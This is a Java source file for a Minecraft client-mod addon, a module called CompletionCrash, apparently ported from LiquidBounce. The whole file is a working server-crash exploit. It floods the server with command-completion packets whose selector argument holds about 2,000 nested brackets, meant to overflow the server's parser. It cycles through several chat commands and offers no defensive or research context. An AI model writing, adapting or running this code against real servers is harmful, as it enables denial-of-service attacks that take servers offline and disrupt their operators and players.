package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

// https://github.com/CCBlueX/LiquidBounce/blob/5593140550914f74ccd55ac0cd7b66da4d43f510/src/main/kotlin/net/ccbluex/liquidbounce/features/module/modules/exploit/servercrasher/exploits/CompletionExploit.kt
public class CompletionCrash extends Module {
    public CompletionCrash() {
        super(CrashAddon.CATEGORY, "CompletionCrash", "Crashes the server using command completions, ported from LiquidBounce");
    }

    private final String[] usedCommands = {
        "msg",
        "minecraft:msg",
        "tell",
        "minecraft:tell",
        "tm",
        "teammsg",
        "minecraft:teammsg",
        "minecraft:w",
        "minecraft:me"
    };

    private int timer = 0;
    private int currentCommandIndex = 0;

    @Override
    public void onActivate() {
        timer = 0;
        currentCommandIndex = 0;
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        timer++;

        if (timer > currentCommandIndex * 20) {
            if (currentCommandIndex > usedCommands.length - 1) {
                toggle();
                info("Done trying.");
                return;
            }

            // send a packet
            var commandToUse = usedCommands[currentCommandIndex];
            info("Trying %s...", commandToUse);
            var overflow = generateJsonObject(2040 - commandToUse.length() - "@a[nbt=]".length());
            var partialCommand = commandToUse + " @a[nbt=" + overflow + "]";

            for (int j = 0; j < 3; j++) {
                mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
            }

            currentCommandIndex++;
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        toggle();
    }

    private String generateJsonObject(int levels) {
        var data = IntStream.range(0, levels).mapToObj(x -> "[").collect(Collectors.joining());
        return String.format("{a:%s}", data);
    }
}
